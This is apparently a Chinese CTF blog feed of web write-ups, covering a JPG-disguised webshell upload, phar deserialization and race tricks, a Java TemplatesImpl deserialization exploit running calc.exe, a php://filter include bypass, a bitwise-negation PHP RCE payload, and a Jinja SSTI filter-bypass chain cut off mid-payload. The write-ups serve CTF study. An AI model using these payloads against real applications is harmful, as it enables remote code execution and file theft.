<h1 id="web820-奇怪的jpg型webshell"><a href="#web820-奇怪的jpg型webshell" class="headerlink" title="web820 奇怪的jpg型webshell"></a>web820 奇怪的jpg型webshell</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$ef</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$tmpname</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>) &amp;&amp; (<span class="variable">$ef</span>!=<span class="literal">false</span>) &amp;&amp; (<span class="variable">$ef</span>[<span class="string">&#x27;mime&#x27;</span>]==<span class="string">&#x27;image/jpeg&#x27;</span>))&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmpname</span>));</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;file upload success!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要是base64_decode这个函数在解码的时候仅保留26+26+2+10，也就是base64里的64个有效字符，其他字符会丢弃</p>
<p>因此可以构造一个jpg，解码后是个webshell</p>
<p>可以用010对一个1*1像素的图片构造</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220515225616-m8bgojg.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>ctfStudy</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>dasctf4月赛</title>
    <url>/2022/05/25/dasctf4%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<h2 id="warmup-php"><a href="#warmup-php" class="headerlink" title="warmup-php"></a>warmup-php</h2><p>附件给了4个类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">            <span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;<span class="comment">//__get</span></span><br><span class="line">        <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">run</span>();<span class="comment">//__call</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Action</span>(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br></pre></td></tr></table></figure>

<p>可控的就是Action类中的construct方法，给的类很多，</p>
<p>从他继承的抽象类的run方法一直进去，反正变量都可控，随便打</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220518192621-gsp7td3.png" alt="image.png"></p>
<h2 id="soeasy-php"><a href="#soeasy-php" class="headerlink" title="soeasy_php"></a>soeasy_php</h2><figure class="highlight docker"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.2</span>.<span class="number">3</span>-fpm</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files /tmp/files/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> src /var/www/html/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R root:root /var/www/html/ &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> -R 755 /var/www/html &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chown</span> -R www-data:www-data /var/www/html/uploads &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.aliyun.com/g&#x27;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;/security/d&#x27;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install nginx -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    /bin/mv -f /tmp/files/default  /etc/nginx/sites-available/default &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    gcc /tmp/files/copyflag.c -o /copyflag &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 4711 /copyflag &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">rm</span> -rf /tmp/files &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">rm</span> -rf /var/lib/apt/lists/* &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 700 /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> nginx&amp;&amp;php-fpm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>


<p>index.php中有注释，标注了edit.php，简单构造能够读到源码</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220518194507-ta3lasm.png" alt="image.png"></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220518194514-hq2mbfa.png" alt="image.png"></p>
<p>这道题是可以用条件竞争非预期的，就是再覆盖flag那里可以趁他覆盖之前，访问head.png，读到就行</p>
<ol>
<li>利用文件上传上传 phar文件</li>
<li>写入超长文件名使得 <code>symlink()</code>函数出错返回 false</li>
<li><code>unlink()</code>触发 phar 反序列化将flag写入到可读的<code>/tmp/flag.txt</code> 处</li>
<li>建立与 <code>/tmp/flag.txt</code> 与 <code>uploads/head.png</code> 的软连接</li>
<li>在建立与 <code>/tmp/flag.txt</code> 的软链接之前程序会将原来写入的flag给覆盖掉。所以要在覆盖flag后，另一个线程已经在copy <code>/falg</code>到 <code>/tmp/flag.txt</code>，这样 <code>/uploads/head.png</code>与<code>/tmp/flag.txt</code>建立了链接，同时flag也没有被覆盖，然后访问 <code>/uploads/head.png</code>读取即可。</li>
</ol>
<p>这里研究作者的预期解，如何让symlink函数报错进到unlink里面</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220518200409-92bp8yw.png" alt="image.png"></p>
<p>这里出题人翻了symlink函数对应的底层c源码，寻找他其中返回false的情况</p>
<p>$filename的长度设置为4096以上，会导致symlink返回false</p>
<p>下面还有一点，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/:|phar|\/\/|php/im&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="variable">$contents</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$contents</span>,<span class="string">&quot;flag&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">filewrite</span>(<span class="variable">$filename</span>,<span class="string">&quot;Don&#x27;t give me flag!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220518201617-ruto186.png" alt="image.png"></p>
<p>这里的<code>$f = fopen($filename,&quot;r&quot;);</code>句柄未关闭，导致可以在&#x2F;proc&#x2F;pid&#x2F;fd&#x2F;fd下读到，且距离die还贴心的给了2秒钟让你爆破</p>
<p>从而可以读到flag内容</p>
<p>剩下的是一些调试上的问题，可惜还没有开始玩底层php，这道题之后有时间再看c源码吧</p>
<p><a href="http://max666.fun/21.html">http://max666.fun/21.html</a></p>
<h2 id="warmup-java"><a href="#warmup-java" class="headerlink" title="warmup-java"></a>warmup-java</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>依赖：</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220519185250-d1r913u.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IndexController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/warmup&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">greeting</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;,required = true)</span> String data, Model model)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] b = Utils.hexStringToBytes(data);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> Class type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyInvocationHandler</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Method[] methods = <span class="built_in">this</span>.type.getDeclaredMethods();</span><br><span class="line">        Method[] var5 = methods;</span><br><span class="line">        <span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> methods.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="number">0</span>; var7 &lt; var6; ++var7) &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">xmethod</span> <span class="operator">=</span> var5[var7];</span><br><span class="line">            xmethod.invoke(args[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>存在问题就是远程打不通，本地通了，猜测是serialVersionUID的问题，这个明天问了佬再解决。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.warmup.MyInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.util.Utils;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> Exp.createTemplatesImpl(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">MyInvocationHandler</span> <span class="variable">myInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyInvocationHandler</span>(TemplatesImpl.class);</span><br><span class="line"></span><br><span class="line">        setFieldValue(myInvocationHandler,<span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> (Comparator) Proxy.newProxyInstance(MyInvocationHandler.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; Comparator.class &#125;,myInvocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl,templatesImpl&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Utils.objectToHexString(queue);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        <span class="type">byte</span>[] b = Utils.hexStringToBytes(s);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">createTemplatesImpl</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//修改Neo类，插入command，创建恶意字节码，此处参考ysoserial</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.getCtClass(StubTransletPayload.class.getName());</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">                command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">                <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;classBytes&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;s&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ctfStudy</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>destdog招新赛web-部分题解</title>
    <url>/2022/05/30/destdog%E6%8B%9B%E6%96%B0%E8%B5%9Bweb/</url>
    <content><![CDATA[<blockquote>
<p>还有很多不足的地方需要学习<br><img src="https://i.imgur.com/f1OQwdW.png"></p>
</blockquote>
<h2 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span><span class="params">(__FILE__)</span>;</span><br><span class="line">require_once <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    require_once($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比较简单，proc突破require_once的限制即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span></span><br></pre></td></tr></table></figure>


<h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;</span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="variable">$timme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(</span><br><span class="line">    function() <span class="keyword">use</span>(&amp;$<span class="title">fl4g</span>) &#123;</span><br><span class="line">        <span class="title">print</span> $<span class="title">fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>让他报错，调用set_error_handler即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctf[]=<span class="variable">$timme</span></span><br></pre></td></tr></table></figure>

<h2 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$aaa</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;pastre&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;pcre&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;sort&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;cut&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$black_list</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>没过滤<code>~</code>，取反</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">aaa=(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%D5);</span><br></pre></td></tr></table></figure>



<h2 id="blockchain"><a href="#blockchain" class="headerlink" title="blockchain"></a>blockchain</h2><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220520105139-rmdsblo.png" alt="image.png"></p>
<h2 id="EasySSTI"><a href="#EasySSTI" class="headerlink" title="EasySSTI"></a>EasySSTI</h2><p>过滤了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">request</span><br><span class="line">[</span><br><span class="line">.</span><br><span class="line">_</span><br><span class="line">空格</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过滤器构造</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>(zero)=(self|<span class="built_in">int</span>)%&#125;&#123;%<span class="built_in">set</span>(one)=(zero**zero)|<span class="built_in">int</span>%&#125;&#123;%<span class="built_in">set</span>(two)=(zero-one-one)|<span class="built_in">abs</span>%&#125;&#123;%<span class="built_in">set</span>(four)=(two*two)|<span class="built_in">int</span>%&#125;&#123;%<span class="built_in">set</span>(five)=(two*two*two)-one-one-one%&#125;&#123;%<span class="built_in">set</span>(three)=five-one-one%&#125;&#123;%<span class="built_in">set</span>(nine)=(two*two*two*two-five-one-one)%&#125;&#123;%<span class="built_in">set</span>(seven)=(zero-one-one-five)|<span class="built_in">abs</span>%&#125;&#123;%<span class="built_in">set</span>(space)=self|string|<span class="built_in">min</span>%&#125;&#123;%<span class="built_in">set</span>(point)=self|<span class="built_in">float</span>|string|<span class="built_in">min</span>%&#125;&#123;%<span class="built_in">set</span>(c)=<span class="built_in">dict</span>(c=aa)|reverse|first%&#125;&#123;%<span class="built_in">set</span>(bfh)=self|string|urlencode|first%&#125;&#123;%<span class="built_in">set</span>(bfhc)=bfh~c%&#125;&#123;%<span class="built_in">set</span>(slas)=bfhc%((four~seven)|<span class="built_in">int</span>)%&#125;&#123;%<span class="built_in">set</span>(yin)=bfhc%((three~nine)|<span class="built_in">int</span>)%&#125;&#123;%<span class="built_in">set</span>(xhx)=bfhc%((nine~five)|<span class="built_in">int</span>)%&#125;&#123;%<span class="built_in">set</span>(right)=bfhc%((four~one)|<span class="built_in">int</span>)%&#125;&#123;%<span class="built_in">set</span>(left)=bfhc%((four~zero)|<span class="built_in">int</span>)%&#125;&#123;%<span class="built_in">set</span>(but)=<span class="built_in">dict</span>(buil=aa,tins=dd)|join%&#125;&#123;%<span class="built_in">set</span>(imp)=<span class="built_in">dict</span>(imp=aa,ort=dd)|join%&#125;&#123;%<span class="built_in">set</span>(pon)=<span class="built_in">dict</span>(po=aa,pen=dd)|join%&#125;&#123;%<span class="built_in">set</span>(so)=<span class="built_in">dict</span>(o=aa,s=dd)|join%&#125;&#123;%<span class="built_in">set</span>(ca)=<span class="built_in">dict</span>(ca=aa,t=dd)|join%&#125;&#123;%<span class="built_in">set</span>(flg)=<span class="built_in">dict</span>(fl=aa,ag=dd)|join%&#125;&#123;%<span class="built_in">set</span>(ev)=<span class="built_in">dict</span>(ev=aa,al=dd)|join%&#125;&#123;%<span class="built_in">set</span>(red)=<span class="built_in">dict</span>(re=aa,ad=dd)|join%&#125;&#123;%<span class="built_in">set</span>(bul)=xhx~xhx~but~xhx~xhx%&#125;&#123;%<span class="built_in">set</span>(ini)=<span 